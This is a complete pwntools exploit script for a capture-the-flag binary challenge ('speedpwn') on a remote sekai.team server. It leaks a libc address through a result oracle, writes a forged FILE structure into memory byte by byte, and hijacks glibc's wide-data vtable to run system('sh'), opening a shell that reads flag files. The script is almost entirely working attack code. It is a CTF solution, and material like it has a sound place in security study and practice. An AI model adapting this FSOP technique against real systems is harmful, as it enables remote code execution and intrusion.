#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("speedpwn.chals.sekai.team", 1337, ssl=True)

    return p


p = conn()

def simulate(a, b):
    p.sendlineafter(">", "s")
    p.sendlineafter(":", str(a))
    p.sendlineafter(":", str(b))

def get_leak():
    leak = 0x0
    for i in range(64):
        simulate("-", leak)
        p.recvuntil("result")
        a = p.recvline()
        if b"You" in a:
            break
        leak <<= 1
        leak |= 1
    leak = leak << (60 - bin(leak).count("1"))
    last = 0
    for _ in range(bin(leak).count("1")):
        for i in range(last, 60):
            tmp = bin(int(bin(leak)[2:], 2) | (1 << i))[2:]
            ind = 0
            while(tmp[ind] == "1"):
                ind += 1
            tmp = int(tmp[:ind-1] + "0" + tmp[ind:], 2)
            simulate("-", tmp)
            p.recvuntil("result")
            a = p.recvline()
            if b"You" not in a:
                last = i + 1
                leak = tmp
                break

    leak = int("7" + hex(leak)[3:], 16)
    return leak

def do_write(data):
    for i in data:
        to_send = ""
        tmp = bin(i)[2:].rjust(8, "0")[::-1]
        for j in tmp: 
            to_send += f"f\n"
            if j == "1":
                to_send += str(0xffffffffffffff) + " "
            else:
                to_send += "0 "
        to_send += "z"
        p.sendlineafter(">", to_send.strip())
        p.recvuntil("Invalid")


                


libc_leak = get_leak()
print(hex(libc_leak))
libc_base = libc_leak - 0x955c2
system = libc_base + 0x58740
got_file = 0x4040a0
got = 0x404000 
fake_wide_data = got + 0x180
wfile_jumps = libc_base + 0x202228
fake_file                = FileStructure(0)
fake_file.flags          = u64(b'  sh\x00\x00\x00\x00')
fake_file._IO_write_base = 0
fake_file._IO_write_ptr  = 1 # _IO_write_ptr > _IO_write_base
fake_file._wide_data     = fake_wide_data
fake_file._lock = got+0x200
fake_file.vtable         = wfile_jumps - 0x28
fake_file_bytes = p64(0)*2 + p64(got_file) + bytes(fake_file)
fake_file_bytes += p64(system) + p64(0)*20 + p64(fake_wide_data-0x68)*10
print(dir(fake_file))

do_write(fake_file_bytes)
sleep(0.1)
debug()
p.sendline("r")



if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)